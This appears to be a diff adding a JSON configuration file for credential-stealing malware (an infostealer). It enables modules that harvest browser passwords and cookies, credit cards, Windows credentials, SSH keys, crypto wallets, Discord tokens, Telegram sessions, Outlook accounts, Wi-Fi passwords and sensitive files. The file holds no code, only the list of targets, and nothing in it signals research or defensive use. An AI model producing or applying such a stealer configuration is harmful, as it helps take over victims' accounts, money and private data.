@@ -1,0 +1,31 @@
+{
+  "EnabledModules": [
+    "SystemInfo",
+    "AllChromiumPasswords",
+    "AllChromiumCookies",
+    "SocialMediaCookies",
+    "FirefoxPasswords",
+    "FirefoxCookies",
+    "BrowserHistory",
+    "CreditCards",
+    "AutofillData",
+    "WindowsCredentials",
+    "Clipboard",
+    "InstalledSoftware",
+    "ProcessList",
+    "SensitiveFiles",
+    "SSHKeys",
+    "GamingClients",
+    "VPNClients",
+    "MessagingApps",
+    "DesktopAppSessions",
+    "CryptoWallets",
+    "CryptoWalletsExtensions",
+    "DiscordAllTokens",
+    "TelegramAllSessions",
+    "OutlookAccounts",
+    "WifiPasswords",
+    "FtpVpn"
+  ],
+  "CompressOutput": false
+}
